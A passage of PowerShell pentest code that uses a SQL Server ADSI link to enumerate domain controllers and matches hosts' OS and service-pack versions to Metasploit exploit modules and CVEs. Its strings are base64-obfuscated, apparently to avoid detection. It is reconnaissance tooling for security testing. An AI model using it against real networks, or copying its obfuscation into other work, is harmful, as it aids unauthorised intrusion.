        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }
    Process
    {
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AYwBvAG0AcAB1AHQAZQByACkAKAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQApAA=='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAbgBzAGgAbwBzAHQAbgBhAG0AZQAsAG8AcABlAHIAYQB0AGkAbgBnAHMAeQBzAHQAZQBtACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AdgBlAHIAcwBpAG8AbgAsAG8AcABlAHIAYQB0AGkAbgBnAHMAeQBzAHQAZQBtAHMAZQByAHYAaQBjAGUAcABhAGMAawAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAAsAGwAbwBnAG8AbgBjAG8AdQBuAHQA'))) -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AYwBvAG0AcAB1AHQAZQByACkAKAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQApAA=='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAbgBzAGgAbwBzAHQAbgBhAG0AZQAsAG8AcABlAHIAYQB0AGkAbgBnAHMAeQBzAHQAZQBtACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AdgBlAHIAcwBpAG8AbgAsAG8AcABlAHIAYQB0AGkAbgBnAHMAeQBzAHQAZQBtAHMAZQByAHYAaQBjAGUAcABhAGMAawAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAAsAGwAbwBnAG8AbgBjAG8AdQBuAHQA')))            
        }
    }
    End
    {               
    }
}
Function  Get-SQLDomainExploitableSystem
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${/==\/============} = New-Object System.Data.DataTable 
        ${/==\/============}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))) | Out-Null 
        ${/==\/============}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))) | Out-Null
        ${/==\/============}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBzAGYATQBvAGQAdQBsAGUA')))) | Out-Null  
        ${/==\/============}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBWAEUA')))) | Out-Null
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgADcA'))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADcAMABfAHcAawBzAHMAdgBjAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA5ADEA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADUAXwAwADMAOQBfAHAAbgBwAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADEAOQA4ADMA')))) | Out-Null  
